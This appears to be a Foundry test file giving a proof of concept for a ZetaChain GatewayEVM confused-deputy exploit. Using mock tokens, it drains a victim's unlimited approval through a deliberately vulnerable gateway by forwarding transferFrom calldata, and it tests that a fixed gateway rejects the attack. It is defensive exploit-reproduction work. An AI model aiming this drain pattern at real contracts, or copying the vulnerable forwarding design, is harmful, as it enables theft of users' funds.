// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {MockERC20} from "./mocks/MockERC20.sol";

/// Debug version of MockERC20 with event logging
contract DebugMockERC20 {
    string public name = "Mock";
    string public symbol = "MOCK";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event TransferFromDebug(address indexed from, address indexed to, uint256 amount, address indexed caller, uint256 allowanceBefore);

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        emit TransferFromDebug(from, to, amount, msg.sender, a);
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}
import {VulnerableGatewayEVM, SafeGatewayEVM, IERC20} from "../src/zeta/GatewayEVM.sol";

/// PoC for ZetaChain GatewayEVM exploit (April 2026, $333K).
///   forge test --match-contract ZetaGatewayEVM -vvv
///
/// Three-defect chain:
/// 1. GatewayZEVM.call on ZetaChain: unauthenticated, no input validation
/// 2. GatewayEVM.execute: forwards arbitrary calldata, including transferFrom
/// 3. Users granted unlimited approvals to gateway, never revoked
///
/// The gateway becomes a confused deputy — attacker uses it to call
/// transferFrom(victim, attacker, amount) against victim's standing approval.
///
/// See docs/exploits/zeta-chain-gatewayevm-2026-04-29.md
contract ZetaGatewayEVMTest is Test {
    MockERC20 token;
    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");
    address tssValidator = makeAddr("tssValidator");
    address allowedHandler = makeAddr("allowedHandler");
    uint256 constant VICTIM_BAL = 100_000e18;

    function setUp() public {
        token = new MockERC20();
        token.mint(victim, VICTIM_BAL);
    }

    function _drainCalldata() internal view returns (bytes memory) {
        // token.transferFrom(victim, attacker, VICTIM_BAL)
        return abi.encodeWithSignature(
            "transferFrom(address,address,uint256)", victim, attacker, VICTIM_BAL
        );
    }

    function test_mockERC20_transferFrom() public {
        // Test that MockERC20 transferFrom works when called by a third party
        address thirdParty = makeAddr("thirdParty");
        
        vm.prank(victim);
        token.approve(thirdParty, type(uint256).max);
        console2.log("allowance[victim][thirdParty]:", token.allowance(victim, thirdParty));
        
        vm.prank(thirdParty);
        token.transferFrom(victim, thirdParty, 1000e18);
        console2.log("victim balance:", token.balanceOf(victim));
        console2.log("thirdParty balance:", token.balanceOf(thirdParty));
    }

    function test_vulnerableGateway_drainsApproval() public {
        VulnerableGatewayEVM gateway = new VulnerableGatewayEVM();

        // Victim approves gateway for unlimited spending (defect 3: standing approval)
        vm.prank(victim);
        token.approve(address(gateway), type(uint256).max);
        
        // Victim deposits some tokens via gateway (simulating normal use)
        vm.prank(victim);
        gateway.deposit(IERC20(address(token)), 1000e18);
        
        // Now the exploit: attacker triggers onCall from "ZetaChain" (anyone can call - defect 1)
        // Forwards arbitrary calldata to gateway itself (defect 2)
        // The calldata is token.transferFrom(victim, attacker, remaining balance)
        uint256 remainingBalance = token.balanceOf(victim);
        bytes memory drainCalldata = abi.encodeWithSignature(
            "transferFrom(address,address,uint256)", victim, attacker, remainingBalance
        );
        vm.prank(attacker);
        gateway.onCall(attacker, address(gateway), bytes(drainCalldata));

        assertEq(token.balanceOf(attacker), remainingBalance, "attacker drained victim's approval");
        assertEq(token.balanceOf(victim), 0, "victim emptied");
    }

    function test_safeGateway_rejectsUnauthorizedSender() public {
        address[] memory callers = new address[](1);
        callers[0] = tssValidator;
        address[] memory targets = new address[](1);
        targets[0] = allowedHandler;
        SafeGatewayEVM gateway = new SafeGatewayEVM(callers, targets);

        // Attacker tries to call onCall but is not allowed caller
        vm.prank(attacker);
        vm.expectRevert(bytes("unauthorized sender"));
        gateway.onCall(attacker, address(gateway), _drainCalldata());
    }

    function test_safeGateway_rejectsTokenAsTarget() public {
        address[] memory callers = new address[](1);
        callers[0] = tssValidator;
        address[] memory targets = new address[](1);
        targets[0] = allowedHandler; // NOT the token contract
        SafeGatewayEVM gateway = new SafeGatewayEVM(callers, targets);

        // Even authorized caller can't target the token contract
        vm.prank(tssValidator);
        vm.expectRevert(bytes("target not allow-listed"));
        gateway.onCall(tssValidator, address(token), _drainCalldata());
    }

    function test_safeGateway_allowsValidCall() public {
        address[] memory callers = new address[](1);
        callers[0] = tssValidator;
        address[] memory targets = new address[](1);
        targets[0] = allowedHandler;
        SafeGatewayEVM gateway = new SafeGatewayEVM(callers, targets);

        // Valid call from authorized sender to allowed target should work
        vm.prank(tssValidator);
        gateway.onCall(tssValidator, allowedHandler, "0x1234");

        // No revert = success
    }
}